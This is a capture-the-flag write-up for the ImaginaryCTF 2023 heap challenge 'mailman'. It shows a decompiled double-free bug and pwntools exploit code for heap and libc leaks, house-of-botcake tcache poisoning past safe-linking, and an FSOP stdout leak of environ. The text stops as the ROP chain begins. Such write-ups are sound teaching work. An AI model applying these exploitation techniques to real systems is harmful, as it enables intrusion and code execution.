<!doctype html>
<html lang="en-us">
  <head>
    <title>[ImaginaryCTF 2023 - pwn] mailman // ret2school</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.92.2" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="nasm" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.3c3c186cd62e563ad6e2f00a89dbee656ab912d1d46f856b5605dd0232521e2a.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="[ImaginaryCTF 2023 - pwn] mailman"/>
<meta name="twitter:description" content="mailman  mailman (423 pts) - 31 solves by Eth007
Description
I&rsquo;m sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there&hellip; Flag is in ./flag.txt.
Attachments https://imaginaryctf.org/r/PIxtO#vuln https://imaginaryctf.org/r/c9Mk8#libc.so.6
nc mailman.chal.imaginaryctf.org 1337
 mailman is a heap challenge I did for the ImaginaryCTF 2023 event. It was a basic heap challenge involving tcache poisoning, safe-linking and seccomp bypass."/>

    <meta property="og:title" content="[ImaginaryCTF 2023 - pwn] mailman" />
<meta property="og:description" content="mailman  mailman (423 pts) - 31 solves by Eth007
Description
I&rsquo;m sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there&hellip; Flag is in ./flag.txt.
Attachments https://imaginaryctf.org/r/PIxtO#vuln https://imaginaryctf.org/r/c9Mk8#libc.so.6
nc mailman.chal.imaginaryctf.org 1337
 mailman is a heap challenge I did for the ImaginaryCTF 2023 event. It was a basic heap challenge involving tcache poisoning, safe-linking and seccomp bypass." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ret2school.github.io/post/mailman/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2023-07-24T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-07-24T00:00:00+00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
      <span class="app-header-title">ret2school</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/post/list_team/">About</a>
             - 
          
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>Just a bunch of french ctf players</p>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">[ImaginaryCTF 2023 - pwn] mailman</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jul 24, 2023
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          10 min read
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
              <a class="tag" href="https://ret2school.github.io/tags/imaginaryctf/">ImaginaryCTF</a>
              <a class="tag" href="https://ret2school.github.io/tags/2023/">2023</a>
              <a class="tag" href="https://ret2school.github.io/tags/heap/">heap</a>
              <a class="tag" href="https://ret2school.github.io/tags/nasm/">nasm</a>
              <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <p><img src="/../../images/lovelive.jpg" alt="Love live qtness"></p>
<h1 id="mailman">mailman</h1>
<blockquote>
<p>mailman (423 pts) - 31 solves by Eth007</p>
<p>Description</p>
<p>I&rsquo;m sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there&hellip;
Flag is in ./flag.txt.</p>
<p>Attachments
<a href="https://imaginaryctf.org/r/PIxtO#vuln">https://imaginaryctf.org/r/PIxtO#vuln</a> <a href="https://imaginaryctf.org/r/c9Mk8#libc.so.6">https://imaginaryctf.org/r/c9Mk8#libc.so.6</a></p>
<p>nc mailman.chal.imaginaryctf.org 1337</p>
</blockquote>
<p>mailman is a heap challenge I did for the <a href="https://2023.imaginaryctf.org">ImaginaryCTF 2023</a> event. It was a basic heap challenge involving tcache poisoning, safe-linking and seccomp bypass. You can find the related files <a href="https://github.com/ret2school/ctf/tree/master/2023/imaginaryctf/pwn/mailman">there</a>.</p>
<h2 id="tldr">TL;DR</h2>
<ul>
<li>Trivial heap and libc leak</li>
<li>tcache poisoning to hiijack stdout</li>
<li>FSOP on stdout to leak environ</li>
<li>tcache poisoning on the fgets&rsquo;s stackframe</li>
<li>ROPchain that takes care of the seccomp</li>
<li>PROFIT</li>
</ul>
<h2 id="code-review">Code review</h2>
<p>First let&rsquo;s take at the version of the libc and at the protections inabled onto the binary.</p>
<pre tabindex="0"><code>$ checksec --file vuln 
[*] '/home/alexis/Documents/pwn/ImaginaryCTF/mailman/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ checksec --file libc.so.6 
[*] '/home/alexis/Documents/pwn/ImaginaryCTF/mailman/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
$ seccomp-tools dump ./vuln
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0010
 0009: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre><p>Full prot for the binary and classic partial RELRO for the already up-to-date libc. The binary loads a seccomp that allows only the read, write, open, fstat and exit system calls.</p>
<p>By reading the code in IDA the main looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__cdecl</span> __noreturn <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>envp)
{
  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>v3; <span style="color:#6272a4">// rax
</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> v4; <span style="color:#6272a4">// [rsp+Ch] [rbp-24h] BYREF
</span><span style="color:#6272a4"></span>  size_t size; <span style="color:#6272a4">// [rsp+10h] [rbp-20h] BYREF
</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v6; <span style="color:#6272a4">// [rsp+18h] [rbp-18h]
</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v7; <span style="color:#6272a4">// [rsp+20h] [rbp-10h]
</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+28h] [rbp-8h]
</span><span style="color:#6272a4"></span>
  v8 <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
  v6 <span style="color:#ff79c6">=</span> seccomp_init(<span style="color:#bd93f9">0LL</span>, argv, envp);
  seccomp_rule_add(v6, <span style="color:#bd93f9">2147418112LL</span>, <span style="color:#bd93f9">2LL</span>, <span style="color:#bd93f9">0LL</span>);
  seccomp_rule_add(v6, <span style="color:#bd93f9">2147418112LL</span>, <span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">0LL</span>);
  seccomp_rule_add(v6, <span style="color:#bd93f9">2147418112LL</span>, <span style="color:#bd93f9">1LL</span>, <span style="color:#bd93f9">0LL</span>);
  seccomp_rule_add(v6, <span style="color:#bd93f9">2147418112LL</span>, <span style="color:#bd93f9">5LL</span>, <span style="color:#bd93f9">0LL</span>);
  seccomp_rule_add(v6, <span style="color:#bd93f9">2147418112LL</span>, <span style="color:#bd93f9">60LL</span>, <span style="color:#bd93f9">0LL</span>);
  seccomp_load(v6);
  setbuf(stdin, <span style="color:#bd93f9">0LL</span>);
  setbuf(stdout, <span style="color:#bd93f9">0LL</span>);
  puts(<span style="color:#f1fa8c">&#34;Welcome to the post office.&#34;</span>);
  puts(<span style="color:#f1fa8c">&#34;Enter your choice below:&#34;</span>);
  puts(<span style="color:#f1fa8c">&#34;1. Write a letter&#34;</span>);
  puts(<span style="color:#f1fa8c">&#34;2. Send a letter&#34;</span>);
  puts(<span style="color:#f1fa8c">&#34;3. Read a letter&#34;</span>);
  <span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> )
  {
    <span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> )
    {
      printf(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>);
      __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d%*c&#34;</span>, <span style="color:#ff79c6">&amp;</span>v4);
      <span style="color:#ff79c6">if</span> ( v4 <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">3</span> )
        <span style="color:#ff79c6">break</span>;
      v7 <span style="color:#ff79c6">=</span> inidx();
      puts(<span style="color:#ff79c6">*</span>((<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>)<span style="color:#ff79c6">&amp;</span>mem <span style="color:#ff79c6">+</span> v7));
    }
    <span style="color:#ff79c6">if</span> ( v4 <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">3</span> )
      <span style="color:#ff79c6">break</span>;
    <span style="color:#ff79c6">if</span> ( v4 <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span> )
    {
      v7 <span style="color:#ff79c6">=</span> inidx();
      printf(<span style="color:#f1fa8c">&#34;letter size: &#34;</span>);
      __isoc99_scanf(<span style="color:#f1fa8c">&#34;%lu%*c&#34;</span>, <span style="color:#ff79c6">&amp;</span>size);
      v3 <span style="color:#ff79c6">=</span> malloc(size);
      <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>mem <span style="color:#ff79c6">+</span> v7) <span style="color:#ff79c6">=</span> v3;
      printf(<span style="color:#f1fa8c">&#34;content: &#34;</span>);
      fgets(<span style="color:#ff79c6">*</span>((<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>)<span style="color:#ff79c6">&amp;</span>mem <span style="color:#ff79c6">+</span> v7), size, stdin);
    }
    <span style="color:#ff79c6">else</span>
    {
      <span style="color:#ff79c6">if</span> ( v4 <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">2</span> )
        <span style="color:#ff79c6">break</span>;
      v7 <span style="color:#ff79c6">=</span> inidx();
      free(<span style="color:#ff79c6">*</span>((<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">**</span>)<span style="color:#ff79c6">&amp;</span>mem <span style="color:#ff79c6">+</span> v7));
    }
  }
  puts(<span style="color:#f1fa8c">&#34;Invalid choice!&#34;</span>);
  _exit(<span style="color:#bd93f9">0</span>);
}
</code></pre></div><p>The program allows to create a chunk of any size, filling it with user-supplied input with fgets. We can print its content or free it. The bug lies in the free handler that doesn&rsquo;t check if a chunk has already been free&rsquo;d.</p>
<h1 id="exploitation">Exploitation</h1>
<p>Before bypassing the seccomp we need to get code execution, to do so I will use the very classic exploitation flow: <code>FSOP stdout to leak environ</code> =&gt; <code>ROPchain</code>. I could have used an <a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/">angry FSOP</a> to directly get code execution by hijjacking the vtable used by the wide operations in stdout, given actually it is not checked against a specific address range as it is the case for the <code>_vtable</code>. To get code execution, we need to get the heap and libc base addresses.</p>
<h2 id="heap-and-libc-leak">Heap and libc leak</h2>
<p>To get a heap leak we can simply do defeat safe-linking:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4"># leak</span>

free(<span style="color:#bd93f9">0</span>)
view(<span style="color:#bd93f9">0</span>)

heap <span style="color:#ff79c6">=</span> ((pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recvline()[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">12</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2000</span>)
pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;heap @ </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(heap)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</code></pre></div><p>To get an arbitrary read / write I used the house of botcake technique. I already talked about it more deeply <a href="https://nasm.re/posts/catastrophe/#house-of-botcake">there</a>. During this house I put a chunk in the unsortedbin, leaking the libc:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">add(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>)

add(<span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>) <span style="color:#6272a4"># prev</span>
add(<span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>) <span style="color:#6272a4"># a</span>

<span style="color:#6272a4"># fill tcache</span>
<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
    free(i)

<span style="color:#ff79c6">for</span> _ <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">20</span>):
    add(<span style="color:#bd93f9">9</span>, <span style="color:#bd93f9">0x10</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># barrier</span>

free(<span style="color:#bd93f9">8</span>) <span style="color:#6272a4"># free(a) =&gt; unsortedbin</span>
free(<span style="color:#bd93f9">7</span>) <span style="color:#6272a4"># free(prev) =&gt; merged with a</span>

<span style="color:#6272a4"># leak libc</span>
view(<span style="color:#bd93f9">8</span>)

libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recvline()[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x219ce0</span> <span style="color:#6272a4"># offset of the unsorted bin</span>
pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc<span style="color:#ff79c6">.</span>address)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</code></pre></div><h2 id="house-of-botcake-for-the-win">House of botcake for the win</h2>
<p>The house of botcake is very easy to understand, it is useful when you can trigger some double free bug. It is basically:</p>
<ul>
<li>Allocate 7 0x100 sized chunks to then fill the tcache (7 entries).</li>
<li>Allocate two more 0x100 sized chunks (prev and a in the example).</li>
<li>Allocate a small “barrier” 0x10 sized chunk.</li>
<li>Fill the tcache by freeing the first 7 chunks.</li>
<li>free(a), thus a falls into the unsortedbin.</li>
<li>free(prev), thus prev is consolidated with a to create a large 0x221 sized chunk that is remains in the unsortedbin.</li>
<li>Request one more 0x100 sized chunk to let a single entry available in the tcache.</li>
<li>free(a) again, given a is part of the large 0x221 sized chunk it leads to an UAF. Thus a falls into the tcache.</li>
<li>That’s finished, to get a write what where we just need to request a 0x130 sized chunk. Thus we can hiijack the next fp of a that is currently referenced by the tcache by the location we wanna write to. And next time two 0x100 sized chunks are requested, the second one will be the target location.</li>
</ul>
<p>Which gives:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
    add(i, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>)

<span style="color:#6272a4"># leak</span>

free(<span style="color:#bd93f9">0</span>)
view(<span style="color:#bd93f9">0</span>)

heap <span style="color:#ff79c6">=</span> ((pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recvline()[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">12</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2000</span>)
pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;heap @ </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(heap)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)

add(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>)

add(<span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>) <span style="color:#6272a4"># prev</span>
add(<span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>) <span style="color:#6272a4"># a</span>

<span style="color:#6272a4"># fill tcache</span>
<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
    free(i)

<span style="color:#ff79c6">for</span> _ <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">20</span>):
    add(<span style="color:#bd93f9">9</span>, <span style="color:#bd93f9">0x10</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># barrier</span>

free(<span style="color:#bd93f9">8</span>) <span style="color:#6272a4"># free(a) =&gt; unsortedbin</span>
free(<span style="color:#bd93f9">7</span>) <span style="color:#6272a4"># free(prev) =&gt; merged with a</span>

<span style="color:#6272a4"># leak libc</span>
view(<span style="color:#bd93f9">8</span>)

libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recvline()[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x219ce0</span> <span style="color:#6272a4"># offset of the unsorted bin</span>
pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc<span style="color:#ff79c6">.</span>address)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)

stdout <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x21a780</span>
environ <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2a72d0</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>
strr <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1bd460</span>

pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;environ: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(environ)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;stdout: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stdout)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)

add(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>) <span style="color:#6272a4"># pop a chunk from the tcache to let an entry left to a </span>
free(<span style="color:#bd93f9">8</span>) <span style="color:#6272a4"># free(a) =&gt; tcache</span>

<span style="color:#6272a4"># unsortedbin =&gt; oob on a =&gt; tcache poisoning</span>
add(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0x130</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;T&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x108</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x111</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(((stdout) <span style="color:#ff79c6">^</span> ((heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2b90</span>) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>))))
add(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;TT&#34;</span>)

<span style="color:#6272a4"># tcache =&gt; stdout</span>
</code></pre></div><p>Then, at the next <code>0x100</code> request <code>stdout</code> will be returned! Something important to notice if you&rsquo;re a beginner in heap exploitation is how the safe-linking is handled, you have to xor the target location with <code>((chunk_location) &gt;&gt; 12))</code>. Sometimes the result is not properly aligned leading to a crash, to avoid this you can add or sub 0x8 to your target location.</p>
<h2 id="fsop-on-stdout">FSOP on stdout</h2>
<p>To leak the address of the stack we can use a FSOP on stdout. To understand how a such attack does work I advice you to read my <a href="https://ret2school.github.io/post/catastrophe/">this write-up</a>. The goal is to read the stack address stored at <code>libc.sym.environ</code> within the libc. Which gives:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4"># tcache =&gt; stdout</span>
add(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">0x100</span>, pwn<span style="color:#ff79c6">.</span>flat(<span style="color:#bd93f9">0xfbad1800</span>, <span style="color:#6272a4"># _flags</span>
                        libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ, <span style="color:#6272a4"># _IO_read_ptr</span>
                        libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ, <span style="color:#6272a4"># _IO_read_end</span>
                        libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ, <span style="color:#6272a4"># _IO_read_base</span>
                        libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ, <span style="color:#6272a4"># _IO_write_base</span>
                        libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x8</span>, <span style="color:#6272a4"># _IO_write_ptr</span>
                        libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x8</span>, <span style="color:#6272a4"># _IO_write_end</span>
                        libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x8</span>, <span style="color:#6272a4"># _IO_buf_base</span>
                        libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span> <span style="color:#6272a4"># _IO_buf_end</span>
                        )
    )

stack <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x160</span> <span style="color:#6272a4"># stackframe of fgets</span>
pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;stack: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stack)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</code></pre></div><h1 id="profit">PROFIT</h1>
<p>Now we leaked everything we just need to reuse the arbitrary write provided thanks to the house of botcake, given we already have overlapping chunks, to get another arbitrary write we just need to put the large chunk in a large tcache and the overlapped chunk in the <code>0x100</code> tcache, then we just have to corrupt <code>victim-&gt;fp</code> to the saved rip of the <code>fgets</code> stackframe :). It gives:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">rop <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ROP(libc, base<span style="color:#ff79c6">=</span>stack)

<span style="color:#6272a4"># ROPchain</span>
